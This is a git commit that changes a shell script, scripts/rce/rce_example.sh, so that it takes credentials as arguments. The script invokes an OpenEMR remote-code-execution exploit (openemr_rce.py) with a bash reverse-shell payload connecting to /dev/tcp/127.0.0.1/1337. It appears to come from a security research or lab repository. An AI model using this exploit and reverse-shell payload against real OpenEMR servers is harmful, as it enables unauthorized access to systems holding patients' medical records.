f3304b1998486e43697af5afacf6506d531ef9ca
stephenrblake <srblake@umass.edu>
2021-04-11 18:30:46 -0700

    Convert username and password into command line arguments

--- scripts/rce/rce_example.sh
+++ scripts/rce/rce_example.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
-python openemr_rce.py  -u admin -p pass -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1' http://localhost/openemr
+# username is first argument, password is second argument
+python openemr_rce.py  -u $1 -p $2 -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1' http://localhost/openemr
 
